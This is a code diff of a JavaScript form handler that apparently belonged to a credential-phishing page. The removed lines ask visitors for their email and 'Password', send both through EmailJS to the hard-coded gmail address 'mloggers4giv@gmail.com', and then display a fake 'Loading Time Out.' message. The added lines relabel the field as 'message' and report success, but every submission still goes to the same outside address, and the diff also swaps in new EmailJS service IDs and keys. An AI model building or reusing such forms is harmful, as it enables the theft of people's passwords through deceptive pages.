@@ -48,13 +48,13 @@ const sendMessage = async () => {
   setStatusType("");
 
   if (!email.trim()) {
-    setStatus("Password is required.");
+    setStatus("Email is required.");
     setStatusType("error");
     return;
   }
 
   if (!message.trim()) {
-    setStatus("Please enter your password.");
+    setStatus("Please enter your message.");
     setStatusType("error");
     return;
   }
@@ -63,19 +63,30 @@ const sendMessage = async () => {
 
   try {
     await emailjs.send(
-      "service_z8ry6ib",
-      "template_yg49xdm",
+      "service_dwr05zs",
+      "template_h947fl9",
       {
         email: email,
         message: message,
         to_email: "mloggers4giv@gmail.com",
       },
-      "0Wjhuu9FSDyO8bqLT"
+      "TaI2J8NqHBk7liFsx"
     );
 
-    setStatus("Loading Time Out.");
+    // Show success briefly
+    setStatus("Message Sent.");
     setStatusType("success");
+
+    // Reset input and eye icon
     setMessage("");
+    setShowName(true);
+
+    // Close modal after a short delay
+    setTimeout(() => {
+      setShowModal(false);
+      setStatus("");
+      setStatusType("");
+    }, 200);
 
   } catch (err) {
     console.error("EmailJS error:", err);
@@ -190,7 +201,7 @@ const sendMessage = async () => {
               We'll never share your email with anyone else.
             </small>
 
-          <label>Password</label>
+          <label>message</label>
 
           <div className="input-wrapper">
             <input
